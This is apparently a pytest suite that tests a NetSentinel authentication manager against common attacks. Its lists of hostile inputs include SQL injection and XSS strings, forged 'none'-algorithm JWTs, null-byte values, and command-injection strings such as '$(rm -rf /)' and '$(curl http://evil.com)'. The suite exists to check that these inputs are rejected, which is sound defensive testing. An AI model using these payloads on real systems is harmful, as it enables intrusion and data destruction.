#!/usr/bin/env python3
"""
Security Vulnerability Tests for NetSentinel Authentication System
Tests for common security vulnerabilities, attack vectors, and edge cases
"""

import pytest
import hashlib
import time
import json
from unittest.mock import Mock, patch
import jwt

from src.netsentinel.security.auth_manager import AuthManager
from src.netsentinel.security.user_store import Role, Permission


class TestSecurityVulnerabilities:
    """Comprehensive security vulnerability testing"""

    def setup_method(self):
        """Setup test fixtures"""
        # Create isolated auth manager
        import uuid
        self.test_id = str(uuid.uuid4())[:8]
        self.secret_key = f"vulnerability_test_{self.test_id}"
        self.storage_path = f"data/test_users_vuln_{self.test_id}.json"
        self.auth_manager = AuthManager(self.secret_key, self.storage_path)

        # Create test users
        self.admin_user = self.auth_manager.create_user(
            user_id=f"admin_user_{self.test_id}",
            username=f"admin_{self.test_id}",
            email=f"admin_{self.test_id}@test.com",
            password_hash=hashlib.sha256("SecurePass123!".encode()).hexdigest(),
            roles=[Role.ADMIN],
        )

        self.test_token = self.auth_manager.authenticate_credentials(
            f"admin_{self.test_id}",
            hashlib.sha256("SecurePass123!".encode()).hexdigest(),
        )

        # Temporarily replace the global auth manager
        import src.netsentinel.security.auth_manager as auth_module
        self.original_get_auth_manager = auth_module.get_auth_manager
        auth_module._auth_manager = self.auth_manager

    def teardown_method(self):
        """Restore original auth manager"""
        import src.netsentinel.security.auth_manager as auth_module
        auth_module._auth_manager = None


class TestPasswordSecurity:
    """Test password-related security vulnerabilities"""

    def setup_method(self):
        """Setup test fixtures"""
        import uuid
        self.test_id = str(uuid.uuid4())[:8]
        self.secret_key = f"password_test_{self.test_id}"
        self.storage_path = f"data/test_users_passwd_{self.test_id}.json"
        self.auth_manager = AuthManager(self.secret_key, self.storage_path)

        # Create test user
        self.username = f"testuser_{self.test_id}"
        self.password_hash = hashlib.sha256("TestPassword123!".encode()).hexdigest()

        self.auth_manager.create_user(
            user_id=f"user_{self.test_id}",
            username=self.username,
            email=f"test_{self.test_id}@test.com",
            password_hash=self.password_hash,
            roles=[Role.ANALYST],
        )

    def test_brute_force_protection_concept(self):
        """Test concept for brute force protection (placeholder)"""
        # This would test account lockout after failed attempts
        # Currently not implemented, but testing the concept

        failed_attempts = 0
        max_attempts = 5

        for i in range(max_attempts + 1):
            token = self.auth_manager.authenticate_credentials(
                self.username,
                "wrong_password_hash",
            )
            if token is None:
                failed_attempts += 1

        # In a real system, after max_attempts, account should be locked
        # For now, we just verify failed authentication doesn't work
        assert failed_attempts == max_attempts + 1

    def test_weak_password_detection(self):
        """Test detection of weak passwords (concept)"""
        # Test various password patterns
        weak_passwords = [
            "password",      # Common password
            "123456",        # Sequential numbers
            "qwerty",        # Keyboard pattern
            "admin",         # Common username
            "",              # Empty password
            "a",             # Single character
        ]

        # Current system doesn't validate password strength
        # This test documents the current behavior
        for weak_pass in weak_passwords:
            weak_hash = hashlib.sha256(weak_pass.encode()).hexdigest()

            # System should still create user (no validation currently)
            user = self.auth_manager.create_user(
                user_id=f"weak_user_{weak_pass}_{self.test_id}",
                username=f"weak_{weak_pass}_{self.test_id}",
                email=f"weak_{weak_pass}_{self.test_id}@test.com",
                password_hash=weak_hash,
                roles=[Role.VIEWER],
            )
            assert user is not None

    def test_password_hash_leakage_prevention(self):
        """Test that password hashes are not leaked in responses"""
        # Authenticate and check that password hash is not in response
        token = self.auth_manager.authenticate_credentials(
            self.username,
            self.password_hash,
        )

        # Decode token to check contents (if JWT)
        try:
            payload = jwt.decode(token, self.secret_key, algorithms=["HS256"])
            # Token should not contain password hash
            assert "password_hash" not in payload
            assert "password" not in payload
        except jwt.InvalidTokenError:
            # If not JWT, skip this check
            pass

    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks"""
        import time

        correct_hash = self.password_hash
        wrong_hash = "wrong_hash_123"

        # Measure timing for correct password
        start_time = time.time()
        result1 = self.auth_manager.authenticate_credentials(self.username, correct_hash)
        correct_time = time.time() - start_time

        # Measure timing for wrong password
        start_time = time.time()
        result2 = self.auth_manager.authenticate_credentials(self.username, wrong_hash)
        wrong_time = time.time() - start_time

        # Results should be boolean, not based on timing
        assert result1 is not None  # Correct should succeed
        assert result2 is None      # Wrong should fail

        # Timing difference should be minimal (within 10ms)
        time_diff = abs(correct_time - wrong_time)
        assert time_diff < 0.01, f"Timing attack possible: {time_diff} seconds difference"


class TestTokenManipulation:
    """Test token manipulation attack vectors"""

    def setup_method(self):
        """Setup test fixtures"""
        import uuid
        self.test_id = str(uuid.uuid4())[:8]
        self.secret_key = f"token_test_{self.test_id}"
        self.auth_manager = AuthManager(self.secret_key)

        # Create test user
        self.user = self.auth_manager.create_user(
            user_id=f"token_user_{self.test_id}",
            username=f"tokenuser_{self.test_id}",
            email=f"token_{self.test_id}@test.com",
            password_hash="hash",
            roles=[Role.ANALYST],
        )

        self.valid_token = self.auth_manager.authenticate_credentials(
            f"tokenuser_{self.test_id}",
            "hash",
        )

    def test_jwt_algorithm_confusion(self):
        """Test protection against JWT algorithm confusion attacks"""
        # Create a token with "none" algorithm (if JWT is used)
        try:
            # Try to decode with different algorithms
            algorithms_to_test = ["HS256", "HS384", "HS512", "RS256", "none"]

            for alg in algorithms_to_test:
                try:
                    # This should fail for "none" algorithm if properly implemented
                    if alg == "none":
                        # Manually create a "none" algorithm token
                        header = {"alg": "none", "typ": "JWT"}
                        payload = {"user_id": self.user.user_id, "exp": time.time() + 3600}
                        import base64

                        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
                        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                        none_token = f"{header_b64}.{payload_b64}."

                        # This should be rejected
                        user = self.auth_manager.authenticate_token(none_token)
                        assert user is None, f"Algorithm 'none' token was accepted"
                    else:
                        # For other algorithms, just test normal validation
                        user = self.auth_manager.authenticate_token(self.valid_token)
                        assert user is not None
                except jwt.InvalidAlgorithmError:
                    # Good, algorithm confusion prevented
                    pass
        except ImportError:
            # JWT not available, skip
            pass

    def test_jwt_signature_manipulation(self):
        """Test protection against JWT signature manipulation"""
        try:
            # Decode valid token
            payload = jwt.decode(self.valid_token, self.secret_key, algorithms=["HS256"])

            # Try to create token with modified payload but same signature
            modified_payload = payload.copy()
            modified_payload["user_id"] = "modified_user_id"

            # This should fail signature verification
            modified_token = jwt.encode(modified_payload, "wrong_secret", algorithm="HS256")
            user = self.auth_manager.authenticate_token(modified_token)
            assert user is None, "Modified token was accepted"

        except ImportError:
            # JWT not available, skip
            pass

    def test_token_replay_attack(self):
        """Test protection against token replay attacks"""
        # Valid token should work once
        user1 = self.auth_manager.authenticate_token(self.valid_token)
        assert user1 is not None

        # Same token should still work (not invalidated after use)
        # In a stateless system, this is expected behavior
        user2 = self.auth_manager.authenticate_token(self.valid_token)
        assert user2 is not None

        # But logout should invalidate it
        self.auth_manager.logout(self.valid_token)
        user3 = self.auth_manager.authenticate_token(self.valid_token)
        assert user3 is None, "Token not invalidated after logout"

    def test_token_tampering_detection(self):
        """Test detection of tampered tokens"""
        # Test various tampering attempts
        tampering_attempts = [
            self.valid_token + "extra",  # Append extra data
            self.valid_token[:-5],       # Truncate
            "invalid." + self.valid_token,  # Prepend invalid data
            self.valid_token.replace(".", ";"),  # Replace characters
        ]

        for tampered_token in tampering_attempts:
            user = self.auth_manager.authenticate_token(tampered_token)
            assert user is None, f"Tampered token was accepted: {tampered_token}"

    def test_expired_token_claims(self):
        """Test handling of expired token claims"""
        # Create token that's already expired
        expired_token = self.auth_manager.token_manager.create_token({
            "user_id": self.user.user_id,
            "username": self.user.username,
        }, expires_in=-1)  # Already expired

        user = self.auth_manager.authenticate_token(expired_token)
        assert user is None, "Expired token was accepted"


class TestSessionFixation:
    """Test session fixation vulnerabilities"""

    def setup_method(self):
        """Setup test fixtures"""
        import uuid
        self.test_id = str(uuid.uuid4())[:8]
        self.secret_key = f"session_test_{self.test_id}"
        self.auth_manager = AuthManager(self.secret_key)

        # Create test user
        self.username = f"sessionuser_{self.test_id}"
        self.password_hash = "session_password_hash"

        self.auth_manager.create_user(
            user_id=f"session_user_{self.test_id}",
            username=self.username,
            email=f"session_{self.test_id}@test.com",
            password_hash=self.password_hash,
            roles=[Role.VIEWER],
        )

    def test_session_fixation_prevention(self):
        """Test that session fixation attacks are prevented"""
        # In session fixation, attacker sets session ID, victim authenticates, attacker uses same session

        # Simulate: Attacker "sets" a token (gets a valid token)
        attacker_token = self.auth_manager.authenticate_credentials(
            self.username,
            self.password_hash,
        )

        # Victim authenticates with same credentials
        victim_token = self.auth_manager.authenticate_credentials(
            self.username,
            self.password_hash,
        )

        # Both should work, but they should be different tokens
        # (This is actually good behavior for stateless systems)
        assert attacker_token != victim_token

        # Both tokens should authenticate to the same user
        attacker_user = self.auth_manager.authenticate_token(attacker_token)
        victim_user = self.auth_manager.authenticate_token(victim_token)

        assert attacker_user is not None
        assert victim_user is not None
        assert attacker_user.user_id == victim_user.user_id

    def test_concurrent_session_handling(self):
        """Test handling of concurrent sessions for same user"""
        # Multiple concurrent logins should be allowed
        tokens = []
        for i in range(5):
            token = self.auth_manager.authenticate_credentials(
                self.username,
                self.password_hash,
            )
            tokens.append(token)
            assert token is not None

        # All tokens should be unique
        assert len(set(tokens)) == len(tokens), "Duplicate tokens generated"

        # All tokens should work
        for token in tokens:
            user = self.auth_manager.authenticate_token(token)
            assert user is not None
            assert user.username == self.username


class TestInjectionAttacks:
    """Test protection against injection attacks"""

    def setup_method(self):
        """Setup test fixtures"""
        import uuid
        self.test_id = str(uuid.uuid4())[:8]
        self.secret_key = f"injection_test_{self.test_id}"
        self.auth_manager = AuthManager(self.secret_key)

    def test_sql_injection_in_username(self):
        """Test protection against SQL injection in username"""
        # Test various SQL injection attempts
        malicious_usernames = [
            "admin' --",
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'; --",
            "user' UNION SELECT * FROM users; --",
        ]

        for malicious_username in malicious_usernames:
            # These should not cause issues or return valid users
            user = self.auth_manager.get_user_by_username(malicious_username)
            assert user is None, f"SQL injection attempt succeeded: {malicious_username}"

            # Authentication should also fail
            token = self.auth_manager.authenticate_credentials(
                malicious_username,
                "any_hash",
            )
            assert token is None, f"SQL injection in username succeeded: {malicious_username}"

    def test_xss_in_user_data(self):
        """Test handling of XSS payloads in user data (now with validation)"""
        # Test that XSS payloads in invalid contexts (like email) are rejected
        xss_attempts = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
        ]

        for xss_payload in xss_attempts:
            # XSS payloads should be rejected as invalid emails
            with pytest.raises(ValueError, match="Invalid email format"):
                self.auth_manager.create_user(
                    user_id=f"xss_user_{hash(xss_payload)}_{self.test_id}",
                    username=f"xss_user_{hash(xss_payload)}_{self.test_id}",
                    email=xss_payload,  # XSS in email - should be rejected
                    password_hash="hash",
                    roles=[Role.VIEWER],
                )

    def test_input_validation_and_sanitization(self):
        """Test that input validation and sanitization works correctly"""
        # Test valid inputs
        user = self.auth_manager.create_user(
            user_id=f"valid_user_{self.test_id}",
            username=f"validuser_{self.test_id}",
            email=f"valid_{self.test_id}@example.com",
            password_hash="hash",
            roles=[Role.VIEWER],
        )
        assert user is not None
        assert user.username == f"validuser_{self.test_id}"
        assert user.email == f"valid_{self.test_id}@example.com"

        # Test invalid username (too short)
        with pytest.raises(ValueError, match="must be at least 3 characters"):
            self.auth_manager.create_user(
                user_id=f"short_user_{self.test_id}",
                username="ab",  # Too short
                email=f"short_{self.test_id}@example.com",
                password_hash="hash",
                roles=[Role.VIEWER],
            )

        # Test invalid username (special characters)
        with pytest.raises(ValueError, match="can only contain"):
            self.auth_manager.create_user(
                user_id=f"special_user_{self.test_id}",
                username="user@domain.com",  # Invalid characters
                email=f"special_{self.test_id}@example.com",
                password_hash="hash",
                roles=[Role.VIEWER],
            )

        # Test invalid email
        with pytest.raises(ValueError, match="Invalid email format"):
            self.auth_manager.create_user(
                user_id=f"bad_email_user_{self.test_id}",
                username=f"bademailuser_{self.test_id}",
                email="not-an-email",  # Invalid email
                password_hash="hash",
                roles=[Role.VIEWER],
            )

    def test_command_injection_in_headers(self):
        """Test protection against command injection via headers"""
        # This would test if headers containing shell commands are handled safely
        # Since we don't directly process headers in auth, this is more of a concept test

        malicious_headers = [
            "$(rm -rf /)",
            "`rm -rf /`",
            "; rm -rf /",
            "| rm -rf /",
            "$(curl http://evil.com)",
        ]

        # Test that auth manager handles various inputs safely
        for malicious_input in malicious_headers:
            # Try to use as username (should be safe)
            user = self.auth_manager.get_user_by_username(malicious_input)
            assert user is None, f"Command injection succeeded: {malicious_input}"

    def test_null_byte_injection(self):
        """Test protection against null byte injection"""
        null_byte_payloads = [
            "admin\x00evil",
            "user\x00admin",
            "\x00admin",
            "admin\x00\x00user",
        ]

        for payload in null_byte_payloads:
            # These should be handled safely
            user = self.auth_manager.get_user_by_username(payload)
            assert user is None, f"Null byte injection succeeded: {repr(payload)}"

            token = self.auth_manager.authenticate_credentials(payload, "hash")
            assert token is None, f"Null byte injection in auth succeeded: {repr(payload)}"


class TestAuditLoggingCompleteness:
    """Test audit logging completeness"""

    def setup_method(self):
        """Setup test fixtures"""
        import uuid
        self.test_id = str(uuid.uuid4())[:8]
        self.secret_key = f"audit_test_{self.test_id}"
        self.auth_manager = AuthManager(self.secret_key)

        # Create test user
        self.auth_manager.create_user(
            user_id=f"audit_user_{self.test_id}",
            username=f"audituser_{self.test_id}",
            email=f"audit_{self.test_id}@test.com",
            password_hash="audit_hash",
            roles=[Role.ANALYST],
        )

    def test_audit_log_completeness(self):
        """Test that all security events are properly audited"""
        initial_log_count = len(self.auth_manager.get_audit_logs())

        # Perform various operations that should be logged
        operations = [
            ("user_creation", lambda: self.auth_manager.create_user(
                user_id=f"test_user_{self.test_id}",
                username=f"testuser_{self.test_id}",
                email=f"test_{self.test_id}@test.com",
                password_hash="hash",
                roles=[Role.VIEWER],
            )),
            ("authentication_success", lambda: self.auth_manager.authenticate_credentials(
                f"audituser_{self.test_id}",
                "audit_hash",
            )),
            ("authentication_failure", lambda: self.auth_manager.authenticate_credentials(
                f"audituser_{self.test_id}",
                "wrong_hash",
            )),
            ("token_refresh", lambda: self.auth_manager.refresh_token(
                self.auth_manager.authenticate_credentials(f"audituser_{self.test_id}", "audit_hash")
            )),
        ]

        for operation_name, operation_func in operations:
            try:
                operation_func()
                # Check if operation was logged
                logs = self.auth_manager.get_audit_logs()
                new_logs = logs[initial_log_count:]

                # Should have at least one log entry for this operation
                operation_logs = [log for log in new_logs if operation_name in log.action]
                # Note: Current implementation may not log all operations
                # This test documents what should be logged

            except Exception as e:
                # Some operations might fail, that's OK for this test
                pass

    def test_audit_log_integrity(self):
        """Test that audit logs cannot be tampered with"""
        # Get current logs
        logs = self.auth_manager.get_audit_logs()
        original_count = len(logs)

        # Perform an operation
        self.auth_manager.authenticate_credentials(f"audituser_{self.test_id}", "audit_hash")

        # Check that logs were added
        new_logs = self.auth_manager.get_audit_logs()
        assert len(new_logs) >= original_count

        # Verify log entries have required fields
        for log in new_logs:
            assert hasattr(log, 'log_id')
            assert hasattr(log, 'user_id')
            assert hasattr(log, 'action')
            assert hasattr(log, 'timestamp')
            assert log.timestamp > 0
            assert isinstance(log.success, bool)


class TestResourceExhaustion:
    """Test protection against resource exhaustion attacks"""

    def setup_method(self):
        """Setup test fixtures"""
        import uuid
        self.test_id = str(uuid.uuid4())[:8]
        self.secret_key = f"resource_test_{self.test_id}"
        self.auth_manager = AuthManager(self.secret_key)

        # Create test user
        self.auth_manager.create_user(
            user_id=f"resource_user_{self.test_id}",
            username=f"resourceuser_{self.test_id}",
            email=f"resource_{self.test_id}@test.com",
            password_hash="resource_hash",
            roles=[Role.VIEWER],
        )

    def test_memory_exhaustion_prevention(self):
        """Test protection against memory exhaustion"""
        # Test with very large inputs
        large_inputs = [
            "A" * 10000,  # 10KB string
            "A" * 100000, # 100KB string
            "A" * 1000000, # 1MB string (if system allows)
        ]

        for large_input in large_inputs:
            try:
                # Try to authenticate with large input
                token = self.auth_manager.authenticate_credentials(large_input, "hash")
                assert token is None  # Should fail authentication

                # Try to get user with large input
                user = self.auth_manager.get_user_by_username(large_input)
                assert user is None  # Should not exist

            except MemoryError:
                # If system runs out of memory, that's a vulnerability
                pytest.fail(f"Memory exhaustion with input size {len(large_input)}")
            except Exception:
                # Other exceptions are OK (validation errors, etc.)
                pass

    def test_cpu_exhaustion_prevention(self):
        """Test protection against CPU exhaustion"""
        # Test with inputs that might cause high CPU usage
        # This is mainly a concept test since current implementation is simple

        complex_inputs = [
            "A" * 1000 + "B" * 1000,  # Alternating patterns
            "\x00" * 1000,            # Null bytes
            "🚀" * 1000,               # Unicode characters
        ]

        import time

        for complex_input in complex_inputs:
            start_time = time.time()

            # Perform operation that might be CPU intensive
            token = self.auth_manager.authenticate_credentials(complex_input, "hash")

            elapsed = time.time() - start_time

            # Operation should complete quickly (< 1 second)
            assert elapsed < 1.0, f"CPU exhaustion possible with input: {elapsed} seconds"
            assert token is None  # Should fail authentication
